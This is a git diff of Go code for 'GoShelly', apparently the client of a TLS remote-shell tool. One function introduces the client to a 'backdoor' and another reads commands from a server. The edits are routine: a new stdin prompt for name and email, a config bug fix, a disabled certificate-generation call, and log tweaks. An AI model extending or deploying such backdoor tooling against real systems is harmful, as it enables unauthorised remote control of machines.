@@ -1,6 +1,7 @@
 package basic
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/tls"
 	"encoding/base64"
@@ -209,7 +210,15 @@ func LoginStatus(statusURL string) bool {
 	fmt.Println(obj.MESSAGE)
 	return resp.StatusCode == http.StatusAccepted
 }
-
+func GetCred() (string,string){
+	var name, email string
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Enter your name: ")
+	name, _ = reader.ReadString('\n')
+	fmt.Print("Enter email address: ")
+	email, _ = reader.ReadString('\n')
+	return name, email
+}
 func GetCredentials(mode int, tem int) (string, string, []byte) {
 	NAME, EMAIL := "", ""
 	if mode == 1 {
@@ -339,12 +348,12 @@ func SaveLoginResult(resp *http.Response, email string) {
 }
 
 func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
-	fmt.Println("Running GoShelly-DEMO")
+	fmt.Println("Running GoShelly")
 	CONFIG.HOST = HOST
 	CONFIG.PORT = PORT
-	CONFIG.SSLEMAIL = PORT
+	CONFIG.SSLEMAIL = SSLEMAIL
 	CONFIG.MAXLOGSTORE = logmax
-	CONFIG.LOGNAME = "./logs/" + "GoShelly" + "-" + time.Now().Format(time.RFC1123) + ".log"
+	CONFIG.LOGNAME = "./logs/" + "GoShelly" + "_" + time.Now().Format(time.RFC1123) + ".log"
 	os.MkdirAll("./logs/", os.ModePerm)
 	clientfile, err := os.OpenFile(CONFIG.LOGNAME, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -355,7 +364,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		defer clientfile.Close()
 	}
 	CONFIG = readStartConfigJSON(false, CONFIG) //change false to true if you have a json config file
-	genCert()
+	// genCert()
 
 	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
 	if err != nil {
@@ -425,7 +434,7 @@ func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {
 	}
 	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 	if string(sDec) != "ok" {
-		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. " + string(buffer))
+		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. " + string(sDec))
 		os.Exit(1)
 	}
 	CONFIG.CLIENTLOG.Println("Client-Server-Intro=" + string(sDec))
@@ -434,7 +443,7 @@ func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {
 
 }
 
-//not the best way to do things but it  works
+
 func readCmdLen(conn *tls.Conn) int {
 	buffer := make([]byte, 1024)
 	setReadDeadLine(conn)
